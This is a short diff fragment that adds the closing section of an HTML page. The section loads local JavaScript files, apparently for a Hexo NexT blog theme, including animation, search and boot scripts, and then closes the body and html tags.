+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
